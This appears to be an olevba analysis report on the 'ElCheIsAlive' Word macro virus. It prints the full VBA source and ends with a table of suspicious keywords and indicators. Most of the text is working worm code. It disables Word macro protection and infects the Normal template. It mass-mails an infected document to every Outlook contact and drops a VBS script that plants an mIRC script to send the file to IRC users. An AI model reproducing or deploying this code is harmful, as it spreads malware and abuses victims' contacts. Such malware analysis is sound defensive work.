olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Siechle-2d8f1680458a0976563e64cae2c46d74f0e70837
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Siechle-2d8f1680458a0976563e64cae2c46d74f0e70837 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Macro.W97.2000/Outlook98.2000/Vbs/Mirc.ElCheIsAlive. By Kalamar
On Error Resume Next 'I think that there are no errors here, but, who knows?, it's just my second virus.
Select Case Application.Version
Case "9.0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Case "8.0"
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
End Select
Set ad = ActiveDocument.VBProject.VBComponents.Item(1) 'It's all the infection routine
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
liad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
lint = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
For li = 1 To liad
If ad.codemodule.lines(li, 1) = "'Macro.W97.2000/Outlook98.2000/Vbs/Mirc.ElCheIsAlive. By Kalamar" Then
inad = True
Exit For
End If
DoEvents
Next
For li = 1 To lint
If nt.codemodule.lines(li, 1) = "'Macro.W97.2000/Outlook98.2000/Vbs/Mirc.ElCheIsAlive. By Kalamar" Then
innt = True
Exit For
End If
DoEvents
Next
If innt <> True Then innt = False
If inad <> True Then inad = False
If innt = True And inad = False Then
Set host = nt
Set Tod = ad
host.Export "c:\Che.sys"
Tod.codemodule.AddFromFile ("c:\Che.sys")
Do Until Tod.codemodule.lines(1, 1) = "Private Sub Document_Open()"
Tod.codemodule.deletelines 1
DoEvents
Loop
End If
If inad = True And innt = False Then
Set host = ad
Set Tod = nt
host.Export "c:\Che.sys"
Tod.codemodule.AddFromFile ("c:\Che.sys")
Do Until Tod.codemodule.lines(1, 1) = "Private Sub Document_Open()"
Tod.codemodule.deletelines 1
DoEvents
Loop
End If 'Infection routine end.
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Che") <> "El Che Vive" Then
whereits = ActiveDocument.FullName
ActiveDocument.SaveAs Environ("WINDIR") & "\El_Che_is_alive.doc"
DoEvents
ActiveDocument.SaveAs whereits
DoEvents
Set Che_OApp = CreateObject("Outlook.Application") 'Here i send the virus to the whole address list, just for Outlook, not outlook express
Set Che_Mapi = Che_OApp.GetNameSpace("MAPI")
For Each Che_AddList In Che_Mapi.AddressLists
If Che_AddList.AddressEntries.Count <> 0 Then
For Che_AddListCount = 1 To Che_AddList.AddressEntries.Count
Set Che_AddListEntry = Che_AddList.AddressEntries(Che_AddListCount)
Set Che_msg = Che_OApp.CreateItem(0)
Che_msg.To = Che_AddListEntry.Address
Che_msg.Subject = "El Che is alive!"
Che_msg.Body = "They told you that El Che was death?." + vbCrLf + "They were rong, check this!"
Che_msg.Attachments.Add Environ("WINDIR") & "\El_Che_is_alive.doc"
Che_msg.DeleteAfterSubmit = True
If Che_msg.To <> "" Then
Che_msg.Send 'Virus sended, one per contact.
DoEvents
End If
DoEvents
Next
End If
Next
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Che") <> "El Che Vive" Then
Open Environ("WINDIR") & "\el_che.vbs" For Output As #1 'Here i make the vbs that search for mirc.ini in your computer, and if it find him, then makes the scipt.ini.
Print #1, "call Che_Forever"
Print #1, "Function Che_Forever()"
Print #1, "If finded <> " & Chr(34) & "true" & Chr(34) & " Then"
Print #1, "  Dim Che_Fso, Che_Driv, Che_Drtype"
Print #1, "  Dim Che_Drivefull"
Print #1, "  Set Che_Fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "  Set Che_Driv = Che_Fso.Drives"
Print #1, "  For Each Che_Drtype In Che_Driv"
Print #1, "    If Che_Drtype.DriveType = Remote Then"
Print #1, "    Che_Drivefull = Che_Drtype & " & Chr(34) & "\" & Chr(34)
Print #1, "    Call Che_Subfolders(Che_Drivefull)"
Print #1, "    ElseIf Che_Drtype.IsReady Then"
Print #1, "    Che_Drivefull = Che_Drtype & " & Chr(34) & "\" & Chr(34)
Print #1, "    Call Che_Subfolders(Che_Drivefull)"
Print #1, "    End If"
Print #1, "  Next"
Print #1, "End If"
Print #1, "End Function"
Print #1, "Function Che_Subfolders(Che_Whichfol)"
Print #1, "Dim Che_Fso, Che_GetFol, Che_Files, Che_File, Che_Subfol"
Print #1, "  Set Che_Fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "  Set Che_GetFol = Che_Fso.GetFolder(Che_Whichfol)"
Print #1, "  Set Che_Files = Che_GetFol.Files"
Print #1, "  For Each Che_File In Che_Files"
Print #1, "   If Che_File.Name = " & Chr(34) & "mirc.ini" & Chr(34) & " Then"
Print #1, "   Call DoMirc(Che_Whichfol)"
Print #1, "   End If"
Print #1, "   Next"
Print #1, "  Set Che_File = Che_GetFol.SubFolders"
Print #1, "  For Each Che_Subfol In Che_File"
Print #1, "   Call Che_Subfolders(Che_Subfol.Path)"
Print #1, "  Next"
Print #1, "End Function"
Print #1, "function DoMirc(path)"
Print #1, "Dim Che_Fso"
Print #1, "Set Che_Fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "Set dirsystem = Che_Fso.GetSpecialFolder(0)"
Print #1, "if right(path,1)<>" & Chr(34) & "\" & Chr(34) & " then"
Print #1, "set scriptini=Che_Fso.CreateTextFile(path & " & Chr(34) & "\script.ini" & Chr(34) & ")"
Print #1, "else"
Print #1, "set scriptini=Che_Fso.CreateTextFile(path & " & Chr(34) & "script.ini" & Chr(34) & ")"
Print #1, "end if"
Print #1, "scriptini.WriteLine " & Chr(34) & "[script]" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & ";Please do not edit this file." & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & ";The modification of the file may cause a disfunction of the Mirc Program." & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & ";_________________________________________." & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n0=on 1:JOIN:#:{" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n1=  /if ( $nick == $me ) { halt }" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n2=  /.dcc send $nick " & Chr(34) & " & dirsystem & " & Chr(34) & "\El_Che_is_alive.doc" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n3=}" & Chr(34)
Print #1, "scriptini.close"
Print #1, "end function"
Close #1
DoEvents
Shell Environ("WINDIR") & "\wscript.exe " & Environ("WINDIR") & "\el_che.vbs %", vbNormalFocus 'Execute the vbs
DoEvents
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Che") = "El Che Vive"
End If
If Day(Now) = Month(Now) Then
Selection.TypeText "El Che is Alive inside of YOU. Let him be free!" 'Just stupid payload
End If
If Day(Now) = 26 And Month(Now) = 1 Then
MsgBox "Happy Birthday Kalamar!", vbInformation + vbOKOnly, "It's my birthday" ''Just stupid payload
End If
'El che Vive, en vos.
'Macro.W97.2000/Outlook98.2000/Vbs/Mirc.ElCheIsAlive
'5/may/2000
'By Kalamar
'Virii Argentina
'Http://www.virii.com.ar
'Infected World
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |el_che.vbs          |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
